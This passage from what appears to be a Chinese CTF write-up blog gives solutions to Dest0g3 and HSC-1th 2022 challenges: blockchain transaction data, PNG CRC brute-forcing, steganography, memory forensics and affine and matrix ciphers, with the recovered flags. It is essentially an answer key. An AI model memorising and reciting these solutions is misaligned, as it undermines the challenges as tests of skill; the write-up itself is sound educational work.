class="line">&#125;</span><br><span class="line"></span><br><span class="line">//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc</span><br></pre></td></tr></table></figure></blockquote><p>应该是非预期，访问url进入合约，在交易0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1的InputData里，可以查看到Hex数据，转字符串可得到flag两截字符串：<code>Dest0g3&#123;0n1y_u5e_priv4t3_i</code>，<code>5_n0t_s4f3_1n_B1okCh4in!&#125;</code>。</p><p>​    </p><h3 id="Easy-predict"><a href="#Easy-predict" class="headerlink" title="Easy predict"></a>Easy predict</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">contract storageplace&#123;</span><br><span class="line">     mapping(uint=&gt;string)private _flag;</span><br><span class="line">     address owner;</span><br><span class="line">     constructor()public&#123;     </span><br><span class="line">     owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function flag() public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint number) public returns(bytes1)&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract question&#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;bool)public regeister;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;uint)private seed;</span><br><span class="line">    </span><br><span class="line">    uint constant Price_Per_Char=10 ether;</span><br><span class="line">    </span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    storageplace immutable Flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        </span><br><span class="line">        storageplace _Flag = new storageplace();</span><br><span class="line">        </span><br><span class="line">        Flag = _Flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isowner()&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;I think you are not the rignt person&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function removeRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function regeist() public &#123;</span><br><span class="line">        require(regeister[msg.sender]==false);</span><br><span class="line">        regeister[msg.sender]=true;</span><br><span class="line">        seed[msg.sender]=block.number+1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyflag(uint want) public payable returns(bytes1)&#123;</span><br><span class="line">        require(msg.value==Price_Per_Char,&quot;is not free&quot;);</span><br><span class="line">        return Flag.buy(want);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function query(bytes32 answer) public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(regeister[msg.sender]);</span><br><span class="line">        require(block.number &gt;seed[msg.sender],&quot;too early&quot;);</span><br><span class="line">        bytes32 result = blockhash(seed[msg.sender]);</span><br><span class="line">        require(answer==result,&quot;wrong answer&quot;);</span><br><span class="line">        return Flag.flag();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925</span><br></pre></td></tr></table></figure></blockquote><p>也是非预期，访问url进入交易0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925，在InputData里，可以查看到Hex数据，转字符串可得到flag五截字符串：<code>Dest0g3&#123;t</code>，<code>_sup3r_e3</code>，<code>hi5_1s_4</code>，<code>ea5y_p</code>，<code>_r1ght?&#125;</code>，按英文字面意思拼接，得：<code>Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;</code>。</p><p>​    </p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><blockquote><p>OCR is very useful in ctf！</p></blockquote><p>更像Misc的AI题，png图片扭曲，应该宽度不对，CRC值爆破宽高：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;flag_pic.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>得到正常图片：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/flag2.png" alt="flag2" style="zoom:50%;"></p><p>找个在线OCR识别图里字符，得到的结果有部分字符不正确，手动修正，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>以Hex保存为7z压缩包文件，解压得到 <code>RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9</code>，base64解码即flag：<code>Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。&lt;/p&gt;
&lt;p&gt;比赛时间：2022.5.20 10:00 - 5.27 10:00&lt;/p&gt;
&lt;p&gt;题目分类：Web、Pwn、Mis</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSC-1th 2022</title>
    <link href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/"/>
    <id>https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/</id>
    <published>2022-02-20T08:28:40.000Z</published>
    <updated>2022-02-21T11:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>前往红客突击队公众号发送“HSC2019”并签到吧！</p></blockquote><p>公众号签到。</p><p>flag{HSC_W3LC0M3}</p><p>​    </p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zip压缩包注释 <code>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？</code>，爆破得到密码 <code>376852</code>；</p><p>得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码；</p><p>修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc}</p><p>​    </p><h3 id="汝闻-人言否"><a href="#汝闻-人言否" class="headerlink" title="汝闻,人言否"></a>汝闻,人言否</h3><p>png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 <code>4B 50</code> 修改为 <code>50 4B</code>；</p><p>发现zip压缩包加密，注释 <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> 为键盘密码，在键盘上画出六个字母 <code>WVALOU</code> 为解压密码，得到 <code>flag</code> 文件，16进制查看发现为wav文件结构；</p><p>使用audacity查看wav文件，在频谱图发现flag：<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>​    </p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 <code>504B0304140000000</code>，为zip压缩包文件头。</p><p>依次还原所有字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>保存为zip文件，打开得到内容 <code>ZmxhZ3tnNUEwIWkyZjF9</code>，base64解码得flag：flag{g5A0!i2f1}</p><p>​    </p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 <code>b1,rgb,lsb,xy</code> 通道隐写了一张png图片，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>是一张二维码，扫描得到内容 <code>wrsak..iehr370</code>，栅栏解密 <code>wireshark3.7.0</code>；</p><p>解压最开始的zip压缩包得到 <code>wireshark</code>，16进制查看发现为pdf文件结构，文件头被修改过，还原为 <code>%PDF</code> （<code>25 50 44 46</code>）正常打开，内容无有用信息，猜想为PDF隐写；</p><p>使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt}</p><p>​    </p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>百度网盘<a href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> 提取码：1qih </p><p>奶牛快传<a href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a> </p><p>蓝奏云<a href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> 密码:cvi0 </p><p>本题目文件PCXP1与PCXP2均需要下载！ </p><p>本题文件中flag{raw_Imfig3_mLs3}属于干扰项</p></blockquote><p>两个dump内存的raw文件，用volatility分析。</p><p>其中一个发现 <code>ffflaaagggg.rar</code> 文件：</p><p><code>0x000000000227db70      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>根据提示，另一个发现 <code>mirror.rar</code> 文件：</p><p><code>0x00000000021221e0      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>分别dumpfiles，按注释<code>key:mirror</code> 解压 <code>mirror.rar</code>，提取 <code>mirror.png</code>，发现后半部分有反转的png，reverse处理得到png内有密码 <code>HSC-1th202248H</code> ；</p><p>用密码解压 <code>ffflaaagggg.rar</code>，得到 <code>secret.pcap</code>，用tshark提取USB流量无结果；</p><p>查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写；</p><p>使用BlindWaterMark工具提取：</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>得到flag：flag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in}</p><p>​    </p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, c, a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的密文为：&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">加密后的密文为：</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>仿射密码加密，先根据密文和明文，爆破各位置存在 <code>flag</code> 字符串情况下对应的 <code>a,b</code> 值，再解密整串密文。</p><p>爆破求 <code>a,b</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>​    </p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>“Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%;"></p></blockquote><p>根据 <code>enc</code> 结果，猜测为 $\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5，得flag：flag{e4163deba70420c58acb87abcab34141}</p><p>​    </p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" 